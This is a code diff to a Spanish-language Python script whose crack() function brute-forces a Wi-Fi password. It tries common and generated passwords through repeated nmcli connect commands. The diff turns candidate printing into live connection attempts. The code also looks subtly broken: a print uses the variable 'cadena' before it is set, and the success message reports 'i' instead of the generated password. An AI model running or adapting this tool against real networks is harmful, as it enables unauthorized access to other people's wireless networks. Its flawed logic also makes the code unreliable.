@@ -68,6 +68,7 @@ def crack(ssid):
     for i in contraseñas_comunes:
       cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", i]
       res = subprocess.run(cmd, capture_output=True, text=True)
+      print(f"Probando {cadena} ...")
       if res.returncode == 0:
             print("¡Conectado con éxito!")
             exito = True
@@ -79,7 +80,14 @@ def crack(ssid):
 
     if cadena not in generadas:
         generadas.add(cadena)
-        print(cadena)
+        cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", cadena]
+        res = subprocess.run(cmd, capture_output=True, text=True)
+        print(f"Probando {cadena} ...")
+        if res.returncode == 0:
+            print("¡Conectado con éxito!")
+            exito = True
+            print(f"Contraseña para {ssid}: {i}")
+            break
     
 
 
